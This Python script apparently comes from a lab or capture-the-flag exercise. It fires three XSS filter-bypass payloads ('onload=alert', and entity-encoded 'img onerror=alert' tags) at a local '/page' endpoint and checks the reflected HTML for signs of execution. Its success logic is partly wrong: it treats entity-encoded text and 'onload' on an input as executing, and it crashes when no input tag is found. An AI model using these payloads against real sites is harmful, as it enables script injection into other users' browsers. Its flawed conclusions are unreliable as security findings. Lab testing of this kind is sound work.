import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

print("=" * 70)
print("XSS Filter Bypass - Final Execution Test")
print("=" * 70)
print()

# The three promising vectors
test_vectors = [
    ("After-tag attribute", "onload=alert('XSS')"),
    ("Decimal entity - full tag", "&#60;img src=x onerror=alert('XSS')&#62;"),
    ("Mixed entity - full tag", "&lt;img src=x onerror=alert('XSS')&gt;")
]

final_results = []

for vector_name, payload in test_vectors:
    print(f"[+] Testing: {vector_name}")
    print(f"Payload: {payload}")
    print()
    
    encoded = urllib.parse.quote(payload, safe='')
    url = f"{base_url}{endpoint}?name={encoded}"
    response = requests.get(url, timeout=10)
    
    print(f"Status: {response.status_code}")
    print(f"Response Length: {len(response.content)}B")
    print()
    
    # Find the input field
    input_pattern = r'<input[^>]*name=[^>]*>'
    match = re.search(input_pattern, response.text)
    
    if match:
        input_tag = match.group(0)
        print("INPUT TAG FOUND:")
        print(input_tag)
        print()
        
        # Check position in HTML
        input_pos = response.text.find(input_tag)
        after_content = response.text[input_pos+len(input_tag):input_pos+len(input_tag)+200]
        print("CONTENT IMMEDIATELY AFTER INPUT TAG:")
        print(after_content)
        print()
        
        # Check for XSS execution indicators
        xss_executing = False
        success_reason = ""
        
        # Is the payload correctly positioned?
        if payload in after_content:
            print("[✓] Payload reflected after input tag")
            
            # Check if we're dealing with entities
            if '&#60;' in payload and '<img src=x' in response.text:
                # Browser would decode &#60; -> < and create <img ...>
                print("[!] CRITICAL: Browser will decode &#60; to <")
                print("    Creates executable: <img src=x onerror=alert('XSS')>")
                xss_executing = True
                success_reason = "HTML entity decoded by browser, forming executable image tag"
            
            if '&lt;' in payload and '<img' in response.text:
                print("[!] WARNING: Browser may decode &lt; to <")
                print("    If not double-encoded by framework, creates <img ...>")
                xss_executing = True
                success_reason = "HTML entity may decode to form executable tag"
            
            if payload.startswith("onload="):
                # Need to check if this creates a new input tag or adds to existing
                if "onload=" in input_tag:
                    # We're inside the input tag
                    print("[!] SUCCESS: onload attribute added to input tag")
                    xss_executing = True
                    success_reason = "Event handler added to existing input tag"
                elif "onload=" in after_content:
                    # We created a new tag or partial tag
                    print("[!] Partial success: onload attribute present")
                    print("    May execute if tag structure is valid")
    
    else:
        print("Input tag not found")
        print("Response preview:", response.text[:500])
    
    print()
    print("-" * 70)
    print()
    
    final_results.append({
        'name': vector_name,
        'payload': payload,
        'executing': xss_executing,
        'reason': success_reason
    })

print("=" * 70)
print("FINAL SUMMARY")
print("=" * 70)
print()

successful_vectors = [r for r in final_results if r['executing']]

if successful_vectors:
    print("[!] SUCCESSFUL XSS VECTOR(S) IDENTIFIED:")
    for r in successful_vectors:
        print()
        print(f"Vector: {r['name']}")
        print(f"Payload: {r['payload']}")
        print(f"Status: {r['reason']}")
else:
    print("[-] No definitive XSS execution identified")

print()
print("All tested vectors:")
for r in final_results:
    status = "✓ SUCCESS" if r['executing'] else "✗ UNCERTAIN"
    print(f"{r['name']:30} | {status}")
